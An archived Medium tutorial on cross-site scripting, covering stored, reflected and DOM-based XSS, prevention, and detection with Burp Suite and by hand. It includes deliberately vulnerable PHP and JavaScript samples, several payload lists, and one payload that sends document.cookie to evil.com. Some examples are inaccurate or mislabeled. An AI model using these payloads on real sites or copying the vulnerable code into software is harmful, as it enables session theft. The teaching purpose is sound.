# Cross-Site-Scripting (XSS)

- **Source URL:** https://medium.com/@RejuKole.com/cross-site-scripting-xss-understanding-and-mitigating-web-vulnerabilities-b2b5a2c606fc?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240925072931/https://medium.com/@RejuKole.com/cross-site-scripting-xss-understanding-and-mitigating-web-vulnerabilities-b2b5a2c606fc
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7354 (id 7354)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Cross-Site-Scripting (XSS): Understanding and Mitigating Web Vulnerabilities

*I’m Reju Kole, a cybersecurity engineer and security researcher with six years of experience in the field. I specialize in web vulnerabilities and offensive security, and I’m currently creating a comprehensive guide on Cross-Site Scripting (XSS) to help others understand and defend against this common web security threat. I’m passionate about sharing my expertise with the community and helping others grow in the cybersecurity space.*

## What is XSS ?

*Cross-Site Scripting (XSS) is a type of security vulnerability found in web applications, where an attacker injects malicious scripts into content that is delivered to users. XSS attacks occur when the application does not properly validate or sanitize user input, allowing the attacker to insert code, usually JavaScript, which gets executed in the victim’s browser.*

*There are three main types of XSS:*

1. **Stored XSS**: *The malicious script is permanently stored on the server (e.g., in a database) and executed when users load the affected page.*
2. **Reflected XSS**: *The malicious script is part of a request (e.g., a URL) and reflected back by the server, then executed by the browser when the user clicks the malicious link.*
3. **DOM-based XSS**: *This occurs when the vulnerability exists in the client-side JavaScript of the application itself, where user input is improperly handled within the Document Object Model (DOM).*

*XSS can be used by attackers to steal session cookies, deface websites, redirect users, or even execute more sophisticated attacks depending on the level of access and permissions. To prevent XSS, developers should properly validate and sanitize input, encode output, and use security mechanisms like Content Security Policy (CSP).*

# Stored XSS

**Stored XSS (Cross-Site Scripting)***, also known as persistent XSS, is a type of vulnerability where malicious scripts are permanently injected into a web application’s stored data (e.g., in a database, message board, or user profile). When other users view the page containing the stored data, the malicious script is automatically executed in their browsers.*

# How Stored XSS Works

1. **Injection**: *The attacker submits malicious code (usually JavaScript) into a form or input field on the website, such as a comment section, user profile, or forum post.*
2. **Storage**: *The malicious input is stored in the server’s database or backend system.*
3. **Execution**: *When a victim loads the page with the stored content, the malicious script is sent to their browser and executed as part of the page, without the user realizing it.*
4. **Result**: *The attacker can perform actions like stealing session cookies, defacing websites, redirecting users to phishing sites, or exploiting the victim’s browser.*

## Example

*A forum allows users to post comments. If the comment section is vulnerable to stored XSS, an attacker could post a comment containing a script, such as:*

`<script>document.cookie = 'stolen=' + document.cookie;</script>`
*This script will execute whenever anyone views the comment, stealing their session cookie.*

# Dangers of Stored XSS

- **Widespread Impact**: *Since the malicious script is stored on the server, every user who visits the affected page could be a target.*
- **Data Theft**: *Attackers can steal session tokens, user credentials, or other sensitive information.*
- **Account Hijacking**: *By using stolen session cookies, attackers can impersonate victims and gain unauthorized access to their accounts.*

# Prevention Techniques

1. **Input Validation and Sanitization**: *Ensure all user input is validated and sanitized to remove potentially malicious code before storing it.*
2. **Output Encoding**: *Escape or encode dynamic content when displaying it in the browser to prevent it from being treated as executable code.*
3. **Content Security Policy (CSP)**: *Implement CSP headers to restrict the execution of scripts, reducing the risk of XSS.*
4. **Use Security Libraries**: *Leverage security frameworks and libraries to manage user input and prevent XSS, such as OWASP’s AntiSamy or Content Security Policy libraries.*

Stored XSS is one of the more dangerous forms of XSS because it can affect multiple users and persistently compromise application security until it’s resolved.


# Reflected XSS

**Reflected XSS (Cross-Site Scripting)** *occurs when malicious scripts are immediately reflected back to the user via the web server, typically through URLs or input fields. Unlike stored XSS, reflected XSS is not stored on the server but delivered to the victim via a crafted link or form submission.*

# How Reflected XSS Works

1. **Injection**: *The attacker creates a malicious link or input (e.g., form data) containing a script.*
2. **Reflection**: *The server reflects this input back in the response without proper sanitization.*
3. **Execution**: *When the victim clicks the link or submits a form, the malicious script is executed in their browser.*

# Example

An attacker might send a link like:

`http://example.com/search?q=<script>alert('XSS')</script>`
*If the website echoes the search query without sanitizing, the script is executed, resulting in an XSS attack.*

## Prevention

- **Input Validation and Output Encoding**: *Ensure all input is properly sanitized, and reflected output is safely encoded.*
- **Avoid Echoing User Input**: *Limit how and when user-provided data is reflected in responses.*

# **DOM-based XSS**

**DOM-based XSS (Cross-Site Scripting)** *occurs when the vulnerability exists in the client-side JavaScript of a web application, rather than on the server. In this type of XSS, the malicious script is executed as a result of modifying the DOM (Document Object Model) without proper validation or sanitization of user input.*

# How DOM-based XSS Works

1. **Injection**: *The attacker crafts a URL or uses an input field to inject a script.*
2. **DOM Manipulation**: *The vulnerable JavaScript on the page modifies the DOM using the injected input (e.g., using* ***document.location***
*,* ***document.write***
*, or similar methods).*
3. **Execution**: *When the browser processes the modified DOM, the malicious script is executed.*

# Example

*If a web application retrieves data from the URL and uses it directly to update the page:*

`document.body.innerHTML = location.hash.substring(1);`
*If a user visits a URL like:*

`http://example.com/#<script>alert('XSS')</script>`
*The script will be executed as part of the page content.*

# Prevention

- **Input Validation and Sanitization**: *Always validate and sanitize user input before processing it in the DOM.*
- **Avoid Dangerous Functions**: *Refrain from using methods that directly manipulate the DOM with user input without proper checks.*
- **Use Security Libraries**: *Leverage libraries that help manage and sanitize user input effectively.*

# Detecting Stored XSS with Burp Suite

*Detecting Stored XSS vulnerabilities using Burp Suite is an essential skill for web application security testing. Here’s how you can effectively identify these vulnerabilities:*

## Step 1: Setup Burp Suite

- **Configure Proxy**: *Set up Burp Suite as a proxy by configuring your browser to route traffic through* ***localhost:8080***
*.*
- **Install Certificate**: *Install the Burp SSL certificate in your browser to intercept HTTPS traffic without issues.*

## Step 2: Browse the Application

- *Navigate through the target web application while Burp Suite is intercepting the traffic.*
- *Look for user input fields such as comment boxes, forums, or user profile sections where data can be submitted.*

## Step 3: Intercept Requests

- *When you find an input field, submit a test payload, such as:*

`<script>alert('XSS')</script>`
- *Burp Suite will intercept the request, allowing you to view and modify it.*

## Step 4: Send to Repeater

- *Right-click the intercepted request and select “****Send to Repeater.****”*
- *In the Repeater tab, modify the request as needed and resend it multiple times to analyze the responses.*

## Step 5: Test for Reflection

- *Check if the application reflects your input back in the response. Adjust the payloads to see if any variations trigger script execution.*

## Step 6: Check for Stored Input

- *After confirming that the input is reflected, submit the payload through the form and navigate to the page where the input is displayed.*
- *If the input executes when the page loads, you’ve found a Stored XSS vulnerability.*

## Step 7: Utilize Extensions

- *Explore the Burp* ***BApp*** *Store for useful extensions like “****XSS Hunter****” or “****DOM Invader****” to enhance your testing capabilities.*

## Step 8: Analyze Responses

- *Examine the responses for any JavaScript execution. Successful execution (e.g., via alerts or console logs) confirms the presence of a Stored XSS vulnerability.*

## Example Payloads

```
1 <script>alert('XSS')</script>
2 <img src=x onerror=alert('XSS')>
3 <svg/onload=alert('XSS')>
```
By following these steps, you can effectively use Burp Suite to detect Stored XSS vulnerabilities in web applications. Always ensure you have proper authorization before testing any application.


# Manual Detection of Stored XSS

*Manually detecting Stored XSS vulnerabilities involves a systematic approach to testing web applications. Here’s a step-by-step guide to help you identify these vulnerabilities without automated tools.*

## Step 1: Identify Input Points

- *Look for places where users can input data, such as:*
- *Comment sections*
- *User registration forms*
- *Profile pages*
- *Message boards*
- *Any other user-generated content areas*

## Step 2: Input Malicious Payloads

- *Submit a variety of payloads to these input fields to test for vulnerabilities. Common payloads include:*

```
1 <script>alert('XSS')</script>
2 <img src=x onerror=alert('XSS')>
3 <svg/onload=alert('XSS')>
```
## Step 3: Check for Reflected Output

- *After submitting a payload, navigate to the page where the input is displayed.*
- *Observe if the input is rendered back to the user without proper encoding or sanitization.*

## Step 4: Analyze the Response

- *If the page executes the script when loaded, it indicates a Stored XSS vulnerability.*
- *Use different payloads to confirm that various scripts are executed.*

## Step 5: Test with Different Browsers

- *Sometimes, different browsers handle scripts differently. Test your payloads in multiple browsers to ensure consistent behavior.*

## Step 6: Review Application Behavior

- *Monitor the application for any abnormal behavior when your payloads are executed. This includes:*
- *Alert pop-ups*
- *Unexpected redirects*
- *Unusual network requests in the developer tools*

## Step 7: Check for Storage

- *Confirm that the payload is stored by reloading the page or checking other users’ views. This ensures that the script persists in the application.*

## Step 8: Document Findings

- *Keep detailed notes on your testing process, including:*
- *Input points tested*
- *Payloads used*
- *Responses received*
- *Evidence of successful exploitation*

Manual detection of Stored XSS vulnerabilities requires a keen eye for input points and a methodical testing approach. By systematically submitting payloads and observing the application’s response, you can effectively identify vulnerabilities and help secure the application.


# Detecting Reflected XSS with Burp Suite

*Burp Suite can streamline the process of detecting Reflected XSS vulnerabilities. Here’s how to use Burp Suite for this purpose:*

## Step 1: Setup Burp Suite

- **Configure Proxy**: *Set Burp Suite as your proxy and configure your browser accordingly.*
- **Install Certificate**: *Ensure the Burp SSL certificate is installed in your browser for HTTPS traffic.*

## Step 2: Browse the Application

- *Navigate to the target web application, looking for input fields and parameters that accept user data.*

## Step 3: Intercept Requests

- *Submit a payload in the input field. For example:*

`<script>alert('XSS')</script>`
*Burp Suite will intercept the request, allowing you to view and modify it.*

## Step 4: Send to Repeater

- *Right-click the intercepted request and select “****Send to Repeater.****”*
- *In the Repeater tab, modify the payload and resend it to observe how the application responds.*

## Step 5: Analyze Responses

- *Look for the payload in the response. If the script executes upon viewing the response, you have identified a Reflected XSS vulnerability.*

## Step 6: Test Variations

- *Use different payloads and repeat the process to confirm the presence of XSS vulnerabilities across various inputs.*

## Step 7: Document Findings

- *Keep a detailed record of your testing, including the input points, payloads, and responses indicating successful execution.*

# Manual Detection of Reflected XSS

*Detecting Reflected XSS vulnerabilities manually involves similar steps as for Stored XSS, but with a focus on immediate input reflection in responses. Here’s a step-by-step guide:*

## Step 1: Identify Input Points

- *Look for any input fields in the application, such as:*
- *Search boxes*
- *URL parameters*
- *Forms that reflect user input in the response*

## Step 2: Craft Malicious Payloads

- *Prepare various payloads to test for reflected XSS, including:*

```
1 <script>alert('XSS')</script>
2 <img src=x onerror=alert('XSS')>
3 <svg/onload=alert('XSS')>
```
## Step 3: Submit Payloads

- *Input the crafted payloads into the identified fields or append them to the URL as parameters. For example:*

`http://example.com/search?q=<script>alert('XSS')</script>`
## Step 4: Analyze the Response

- *Observe the application’s response after submitting the payload. Look for signs of script execution, such as alert boxes or unexpected behavior.*

## Step 5: Test with Different Browsers

- *Check the payload in various browsers to ensure consistent execution across different environments.*

## Step 6: Review Application Behavior

- *Use developer tools to monitor any unusual network requests or JavaScript execution related to your payload.*

## Step 7: Document Findings

- *Record your testing process, including:*
- *Input points tested*
- *Payloads used*
- *Responses received*
- *Evidence of script execution*

Both manual testing and using Burp Suite are effective methods for detecting Reflected XSS vulnerabilities. While manual testing requires careful observation and analysis, Burp Suite enhances the process with tools for interception and response analysis. Always ensure proper authorization before testing any application.


# Detecting DOM-based XSS with Burp Suite

*Using Burp Suite can enhance the detection of DOM-based XSS vulnerabilities. Here’s how to leverage Burp Suite for this purpose:*

## Step 1: Setup Burp Suite

- **Configure Proxy**: *Set up Burp Suite as a proxy and configure your browser accordingly.*
- **Install Certificate**: *Make sure the Burp SSL certificate is installed in your browser for HTTPS traffic.*

## Step 2: Browse the Application

- *Navigate through the application, paying attention to input points that affect the DOM, such as hash fragments and query parameters.*

## Step 3: Intercept Requests

- *When you identify a potential input point, manipulate it to include a payload. For example:*

`http://example.com/#<script>alert('XSS')</script>`
*Burp Suite will intercept the request, allowing you to analyze it.*

## Step 4: Analyze JavaScript Responses

- *Use Burp’s tools to analyze how the application’s JavaScript processes user input. Look for any direct DOM manipulation that could lead to XSS.*

## Step 5: Test Variations

- *Modify the payloads and resend requests to see how the application responds to different inputs.*

## Step 6: Document Findings

- *Keep a detailed record of your tests, including input points, payloads, and any evidence of successful execution.*

# Manual Detection of DOM-based XSS

*Detecting DOM-based XSS vulnerabilities manually requires a focus on how client-side scripts manipulate the DOM. Here’s a step-by-step guide to help you identify these vulnerabilities:*

## Step 1: Identify JavaScript Manipulation Points

- *Look for places in the application where JavaScript handles user input, such as:*
- *URL fragments (hash values)*
- *Query parameters*
- *User input fields that affect the DOM directly*

## Step 2: Craft Malicious Payloads

- *Prepare payloads that can be executed in the DOM, such as:*

```
1 <script>alert('XSS')</script>
2 <img src=x onerror=alert('XSS')>
3 <svg/onload=alert('XSS')>
```
## Step 3: Test URL Manipulation

- *Manipulate the URL to include your payload. For example:*

`http://example.com/#<script>alert('XSS')</script>`
*Observe how the application processes this input in the client-side JavaScript.*

## Step 4: Analyze DOM Behavior

- *Use browser developer tools (F12) to inspect the DOM and see if the payload is rendered. Check for script execution via:*
- *Console output*
- *Alert boxes*
- *Network requests*

## Step 5: Review JavaScript Code

- *If accessible, examine the JavaScript code for unsafe functions, such as:*
- ***document.write()***
- ***innerHTML***
- ***eval()***

*These functions can indicate potential vulnerabilities if they use user input without proper sanitization.*

## Step 6: Document Findings

- *Keep detailed notes on your testing process, including:*
- *Input points tested*
- *Payloads used*
- *Observed DOM changes and script executions*

Both manual testing and using Burp Suite are effective methods for detecting DOM-based XSS vulnerabilities. Manual detection focuses on analyzing user inputs and their effect on the DOM, while Burp Suite provides tools to intercept and analyze requests and responses. Always ensure proper authorization before testing any application.


# Reflected XSS

## Example: A Vulnerable Comment Submission

```
<!-- vulnerable_comment.php -->
<form action="submit_comment.php" method="post">
    <textarea name="comment" placeholder="Leave a comment..."></textarea>
    <input type="submit" value="Post Comment">
</form>
```
```
// submit_comment.php
$comment = $_POST['comment'];
echo "User comment: " . $comment;
```
## Explanation

*In this example, a comment submission form allows users to enter comments that are sent to submit\_comment.php. The script retrieves the comment using $\_POST\['comment'\] and directly displays it on the page without any validation or encoding.*

**This is an example of Stored XSS (Cross-Site Scripting). Here’s how it works:**

1. **User Input**: *A user can submit a comment containing malicious code, such as* ***<script>alert('XSS');</script>***
***.***
2. **Storage**: *The submitted comment is stored (implicitly) and can be viewed by other users.*
3. **Execution**: *When another user visits the page that displays comments, the malicious script executes in their browser, leading to potential exploitation, such as data theft or session hijacking.*

*The vulnerability arises because user input is rendered directly in the output without any form of sanitization or encoding, allowing for the injection of harmful scripts that can be executed in the context of other users’ browsers.*

## Example: A Vulnerable Error Message

```
// error_page.php
$error_message = $_GET['error'];
echo "An error occurred: " . $error_message;
```
## Explanation:

*In this example, the error\_page.php script retrieves an error message from the URL using $\_GET\['error'\] and directly displays it on the page.*

**This is an example of Reflected XSS (Cross-Site Scripting). Here’s how it works:**

1. **User Input**: *An attacker can craft a URL with a malicious error message, such as:*

`https://example.com/error_page.php?error=<script>alert('XSS');</script>`
**2. Execution**: *When a user clicks on this link, the application displays the crafted error message. The script \<script>alert('XSS');\</script> executes in the user's browser.*

**3 . Impact**: *This can lead to various malicious outcomes, such as stealing cookies, redirecting users to phishing sites, or performing actions on behalf of the user.*

*The vulnerability arises because user input is echoed directly onto the page without any validation or encoding, allowing for the injection and execution of harmful scripts.*

# **DOM-based XSS**

## Example: Vulnerable JavaScript Code

```
<!-- vulnerable_page.html -->
<script>
var data = document.location.hash.substring(1);
document.write("Welcome, " + data);
</script>
```
## Explanation:

*In this example, the JavaScript code retrieves data from the URL hash and directly writes it to the document using document.write().*

**This is an example of DOM-based XSS (Cross-Site Scripting). Here’s how it works:**

1. **User Input**: *An attacker can manipulate the URL hash by using a link like:*

`https://example.com/vulnerable_page.html#<script>alert('XSS');</script>`
**2. Execution**: *When the page loads, the JavaScript retrieves the hash value and executes the document.write() function. This leads to the injection of the script, which runs in the user's browser.*

**3. Impact**: *The script executes, potentially allowing the attacker to perform actions such as stealing session cookies, redirecting users, or executing other malicious scripts.*

*The vulnerability exists because the code directly uses untrusted user input in a way that allows script execution without any form of validation or sanitization, making it easy for attackers to exploit.*

**Payload:** \`**#\<script>alert(‘XSS’);\</script>**\`

# Example: Insecure Use of `innerHTML`

```
<!-- vulnerable_form.html -->
<form onsubmit="displayMessage(); return false;">
    <input type="text" id="message" placeholder="Enter your message…">
    <input type="submit" value="Submit">
</form>
<div id="output"></div>
<script>
function displayMessage() {
    var message = document.getElementById("message").value;
    document.getElementById("output").innerHTML = "Your message: " + message;
}
</script>
```
## Explanation:

*In this example, the JavaScript function displayMessage() retrieves the value entered by the user in the input field and assigns it to the inner HTML of a div element.*

**This is an example of DOM-based XSS (Cross-Site Scripting). Here’s how it works:**

1. **User Input**: *An attacker can input a malicious payload, such as*:

`<script>alert('XSS');</script>`
**2. Execution**: *When the user submits the form, the displayMessage() function executes and sets the inner HTML of the output div to include the user's input. This results in:*

`<div id="output">Your message: <script>alert('XSS');</script></div>`
*The script tag executes immediately when inserted into the DOM.*

**3. Impact**: *The injected script executes in the user’s browser, which can lead to various malicious outcomes, such as stealing cookies or redirecting the user to a malicious site.*

*The vulnerability arises because the code uses innerHTML to insert untrusted user input directly into the HTML document without any validation or sanitization, allowing for script injection and execution.*

**Payload:** \`**\<img src=x onerror=alert(‘XSS’);>**\`

## **Here are 10 example payloads for Stored XSS, DOM-based XSS, and Reflected XSS**

# Stored XSS Payloads

1. **<script>alert('Stored XSS');</script>**
2. **<img src=x onerror=alert('Stored XSS') />**
3. **<svg><script>alert('XSS');</script></svg>**
4. **<iframe src="javascript:alert('XSS')"></iframe>**
5. **<body onload=alert('Stored XSS')>**

# DOM-based XSS Payloads

1. **javascript:alert('DOM-based XSS');**
2. **<script>document.body.innerHTML += '<img src=x onerror=alert(1)>';</script>**
3. **#<script>fetch('https://evil.com?cookie=' + document.cookie);</script>**
4. **javascript:alert(document.location.hash.substring(1));**
5. **<script>var data = document.location.hash.substring(1); document.write(data);</script>**

# Reflected XSS Payloads

1. **<script>alert('Reflected XSS');</script>**
2. **https://example.com/page?query=<script>alert('XSS');</script>**
3. **https://example.com/search?q=<img src=x onerror=alert('XSS') />**
4. **https://example.com/error?message=<script>alert('XSS');</script>**
5. **https://example.com?input=<svg onload=alert('XSS')>**

**Grasping the different types of Cross-Site Scripting (XSS) vulnerabilities — Stored, Reflected, and DOM-based XSS — is essential for web application security professionals and penetration testers. Utilizing a mix of automated tools and manual testing methods allows for effective detection and exploitation of these vulnerabilities. With my expertise and commitment to security, I strive to enhance the overall security posture of web applications, ensuring robust protection against potential threats.**


*I hope you enjoyed this writeup! Happy Hacking :)*

**Subscribe to me on Medium and be sure to turn on email notifications so you never miss out on my latest walkthroughs, write-ups, and other informative posts.**


# Follow me on below Social Media:

1. ***LinkedIn:*** [***Reju Kole***](http://www.linkedin.com/in/reju-kole)

*2. Instagram: reju.kole.9*

*3. Respect me On HackTheBox! : Hack The Box :: User Profile*

*4. Check My TryHackMe Profile : TryHackMe | W40X*

*5. Twitter | X : @Mr\_W40X*

*6. GitHub : W40X | Reju Kole | Security Researcher*

**incase you need any help feel free to message me on my social media handles.**
